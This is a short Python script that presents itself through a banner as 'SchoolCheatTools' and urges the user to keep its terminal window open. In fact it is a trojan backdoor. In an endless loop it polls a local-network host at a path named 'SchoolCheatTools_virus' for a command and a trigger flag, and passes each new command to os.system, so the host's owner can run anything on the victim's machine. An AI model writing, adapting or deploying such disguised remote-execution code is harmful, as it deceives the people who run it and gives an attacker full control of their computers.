#setup
from bs4 import BeautifulSoup
import requests
import os
from time import *
old_command = 0

print('''
      
░██████╗░█████╗░██╗░░██╗░█████╗░░█████╗░██╗░░░░░░█████╗░██╗░░██╗███████╗░█████╗░████████╗████████╗░█████╗░░█████╗░██╗░░░░░░██████╗
██╔════╝██╔══██╗██║░░██║██╔══██╗██╔══██╗██║░░░░░██╔══██╗██║░░██║██╔════╝██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██╔════╝
╚█████╗░██║░░╚═╝███████║██║░░██║██║░░██║██║░░░░░██║░░╚═╝███████║█████╗░░███████║░░░██║░░░░░░██║░░░██║░░██║██║░░██║██║░░░░░╚█████╗░
░╚═══██╗██║░░██╗██╔══██║██║░░██║██║░░██║██║░░░░░██║░░██╗██╔══██║██╔══╝░░██╔══██║░░░██║░░░░░░██║░░░██║░░██║██║░░██║██║░░░░░░╚═══██╗
██████╔╝╚█████╔╝██║░░██║╚█████╔╝╚█████╔╝███████╗╚█████╔╝██║░░██║███████╗██║░░██║░░░██║░░░░░░██║░░░╚█████╔╝╚█████╔╝███████╗██████╔╝
╚═════╝░░╚════╝░╚═╝░░╚═╝░╚════╝░░╚════╝░╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═════╝░

IMPORTANT   ***   PLEASE KEEP THIS WINDOW OPEN
IMPORTANT   ***   WHEN USING SCHOOLCHEATTOOLS, PLEASE KEEP IT RUNNING IN THE BACKSTAGE, DO NOT CLOSE THE TERMINAL WINDOW, OTHERWISE SCHOOLCHEATTOOLS WON’T WORK
''')

while True:
    #get HTML
    command = requests.get('http://192.168.0.216/SchoolCheatTools_virus/command.txt').text
    exe = (requests.get('http://192.168.0.216/SchoolCheatTools_virus/execute_command.txt').text == "1")
    #execute command
    if old_command != command and exe:
        try:
            os.system(command)
            old_command = command
        except:
            pass
    sleep(0.6)